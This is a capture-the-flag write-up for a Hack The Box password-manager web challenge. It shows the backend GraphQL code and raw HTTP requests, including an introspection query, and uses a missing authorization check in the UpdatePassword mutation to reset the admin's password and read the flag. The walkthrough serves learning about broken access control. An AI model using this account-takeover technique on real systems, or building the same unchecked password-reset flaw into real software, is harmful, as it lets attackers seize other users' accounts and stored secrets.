# 1 - Challenge code and Descripton

```
Pandora discovered the presence of a mole within the ministry.
To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager.
Can you hack into the password manager?
```

We ae given the project files including backeng js, dockerfile, database queries and ...

1. First of all this is DB tables

```sql
CREATE DATABASE passman;

CREATE TABLE passman.users (
    id          INT NOT NULL AUTO_INCREMENT,
    username    VARCHAR(256) UNIQUE NOT NULL,
    password    VARCHAR(256) NOT NULL,
    email       VARCHAR(256) UNIQUE NOT NULL,
    is_admin    INT NOT NULL DEFAULT 0,
    PRIMARY KEY (id)
);

INSERT INTO passman.users (username, password, email, is_admin)
VALUES
    ('admin', '$(genPass)', 'admin@passman.htb', 1),
    ('louisbarnett', '$(genPass)', 'louis_p_barnett@mailinator.com', 0),
    ('ninaviola', '$(genPass)', 'ninaviola57331@mailinator.com', 0),
    ('alvinfisher', '$(genPass)', 'alvinfisher1979@mailinator.com', 0);


CREATE TABLE IF NOT EXISTS passman.saved_passwords (
    id         INT NOT NULL AUTO_INCREMENT,
    owner      VARCHAR(256) NOT NULL,
    type       VARCHAR(256) NOT NULL,
    address    VARCHAR(256) NOT NULL,
    username   VARCHAR(256) NOT NULL,
    password   VARCHAR(256) NOT NULL,
    note       VARCHAR(256) NOT NULL,
    PRIMARY KEY (id)
);

INSERT INTO passman.saved_passwords (owner, type, address, username, password, note)
VALUES
    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'password'),
    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),
    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),
    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),
    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),
    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');

GRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```
If we look closer we see that the flag is inside `saved_passwords` table which is for admin user


2. We also have graphql in backend which do login,register,save password, ...

Here is register request

```http
POST /graphql HTTP/1.1
Host: 138.68.162.218:32084
Content-Length: 237
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://138.68.162.218:32084
Referer: http://138.68.162.218:32084/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

{
  "query": "mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }",
  "variables": {
    "email": "test@test.com",
    "username": "0x17",
    "password": "1234"
  }
}
```

And here is the backed graphql section for registration which is `Graphql Mutation`

```js
name: 'Mutation',
fields: {
    RegisterUser: {
        type: ResponseType,
        args: {
            email: { type: new GraphQLNonNull(GraphQLString) },
            username: { type: new GraphQLNonNull(GraphQLString) },
            password: { type: new GraphQLNonNull(GraphQLString) }
        },
        resolve: async (root, args, request) => {
            return new Promise((resolve, reject) => {
                db.registerUser(args.email, args.username, args.password)
                    .then(() => resolve(response("User registered successfully!")))
                    .catch(err => reject(new GraphQLError(err)));
            });
        }
    },
```

Here is login request

```http
POST /graphql HTTP/1.1
Host: 138.68.162.218:32084
Content-Length: 185
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://138.68.162.218:32084
Referer: http://138.68.162.218:32084/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

{
  "query": "mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }",
  "variables": {
    "username": "0x17",
    "password": "1234"
  }
}
```

And here is the backend graphql code which is also a `Graphql Mutation`

```js
LoginUser: {
    type: ResponseType,
    args: {
        username: { type: new GraphQLNonNull(GraphQLString) },
        password: { type: new GraphQLNonNull(GraphQLString) }
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            db.loginUser(args.username, args.password)
                .then(async (user) => {
                    if (user.length) {
                        let token = await JWTHelper.sign( user[0] );
                        resolve({
                            message: "User logged in successfully!",
                            token: token
                        });
                    };
                    reject(new Error("Username or password is invalid!"));
                })
                .catch(err => reject(new GraphQLError(err)));
        });
    }
},
```

After logging in a JWT is assigned to us which indicates our user.\
Our goal is to get flag which is inside saved_passwords database inside admin notes\
Each user can see his/her only notes not others according to this code which is a `Graphql Query`

```js
name: 'Query',
fields: {
    getPhraseList: {
        type: new GraphQLList(PhraseSchema),
        resolve: async (root, args, request) => {
            return new Promise((resolve, reject) => {
                if (!request.user) return reject(new GraphQLError('Authentication required!'));

                db.getPhraseList(request.user.username)
                    .then(rows => resolve(rows))
                    .catch(err => reject(new GraphQLError(err)))
            });
        }
    }
}
```

So we as a non-admin user can not see admin`s notes which is flag\
There are also two other `Graphql Mutations`

**AddPhrase** : which is for adding note

```js
AddPhrase: {
    type: ResponseType,
    args: {
        recType: { type: new GraphQLNonNull(GraphQLString) },
        recAddr: { type: new GraphQLNonNull(GraphQLString) },
        recUser: { type: new GraphQLNonNull(GraphQLString) },
        recPass: { type: new GraphQLNonNull(GraphQLString) },
        recNote: { type: new GraphQLNonNull(GraphQLString) },
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            if (!request.user) return reject(new GraphQLError('Authentication required!'));

            db.addPhrase(request.user.username, args)
                .then(() => resolve(response("Phrase added successfully!")))
                .catch(err => reject(new GraphQLError(err)));
        });
    }
  },
```

**UpdatePassword**: which is for changing password for a user

```js
UpdatePassword: {
    type: ResponseType,
    args: {
        username: { type: new GraphQLNonNull(GraphQLString) },
        password: { type: new GraphQLNonNull(GraphQLString) }
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            if (!request.user) return reject(new GraphQLError('Authentication required!'));

            db.updatePassword(args.username, args.password)
                .then(() => resolve(response("Password updated successfully!")))
                .catch(err => reject(new GraphQLError(err)));
        });
    }
},
```

The `UpdatePassword` Mutation looks interesting and as we can see there is no proper authentication to prevent nonadmin users to change other users' password\
Let's look at the `UpdatePassword Mutation` schema through [graphql introspection query](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)

```http
POST /graphql HTTP/1.1
Host: 138.68.162.218:32084
Content-Length: 106
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://138.68.162.218:32084
Referer: http://138.68.162.218:32084/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

{
  "query": "{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"
}
```

And here is the `UpdatePassword` Mutation

```json
{
  "name": "UpdatePassword",
  "args": [
    {
      "name": "username",
      "description": null,
      "type": {
        "name": null,
        "kind": "NON_NULL",
        "ofType": {
          "name": "String",
          "kind": "SCALAR"
        }
      }
    },
    {
      "name": "password",
      "description": null,
      "type": {
        "name": null,
        "kind": "NON_NULL",
        "ofType": {
          "name": "String",
          "kind": "SCALAR"
        }
      }
    }
  ]
}
```

We can see we need two parameters (username,password) which we can change every user's password without proper authorization.\
Here is the graphql query for updating admin's password (I built it based on login mutation which is similar to UpdatePassword)

```http
POST /graphql HTTP/1.1
Host: 138.68.162.218:32084
Content-Length: 191
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://138.68.162.218:32084
Referer: http://138.68.162.218:32084/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjB4MTciLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5Nzk3MDQ0fQ.54ogANqo_0hbJBlo_RtgWQDOoUQ3qeRz7ayBqW4KosU

{
  "query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }",
  "variables": {
    "username": "admin",
    "password": "1234"
  }
}
```

And here is the response:

```json
{
  "data": {
    "UpdatePassword": {
      "message": "Password updated successfully!",
      "token": null
    }
  }
}
```

It seems we changed admin's password, Let's check it\
Yes, we logged in as admin and now we can see admin's notes inside saved_password table which is actually the flag

```http
POST /graphql HTTP/1.1
Host: 138.68.162.218:32084
Content-Length: 84
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://138.68.162.218:32084
Referer: http://138.68.162.218:32084/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY3OTc5ODMyOH0.uZ5Bqop3SSoHX4cgxHZn6kJLKXT3CX3d3wz9WLE4bRw
Connection: close

{
  "query": "{ getPhraseList { id, owner, type, address, username, password, note } }"
}
```

```json
{
  "data": {
    "getPhraseList": [
      {
        "id": "1",
        "owner": "admin",
        "type": "Web",
        "address": "igms.htb",
        "username": "admin",
        "password": "HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}",
        "note": "password"
      }
    ]
  }
}
```

And here is the flag:
```
HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}
```
